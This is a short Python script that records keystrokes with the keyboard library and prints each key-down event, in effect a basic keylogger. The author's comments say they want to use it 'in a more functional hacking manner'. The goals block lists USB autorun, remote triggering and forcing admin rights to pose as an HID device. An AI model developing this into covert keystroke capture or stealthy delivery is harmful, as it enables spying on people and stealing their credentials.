# -*- coding: utf-8 -*-
"""
Created on Fri Mar 25 13:23:26 2022

@author: SamuelJames
"""

import keyboard
import time
import os
import mouse 

shot_pressed = 0
try:
    #keyboard.add_abbreviation('1', 'LETSSSSSSSSSSSSSS GOOOOOOOOOOOOOOOOOOOOOOOOOOOO')
    recorded = keyboard.record(until='enter')
    
    for rec in recorded:
        if 'down' in str(rec):
            print(rec)
    
except KeyboardInterrupt:
    print("GOODBYE")
    
# now how do I autorun this from a fucking usb???
# this is a simple way to do key tracing, but I need to work on using this in a more functional hacking manner
'''
Goals:
    1 - run as program from an auto.inf USB file (NOW BLOCKED BY WINDOWS)
    2 - Autorun over https port by runn javascript calling python?
    3 - Force admin priviledge to change device to HID, then run?
    
'''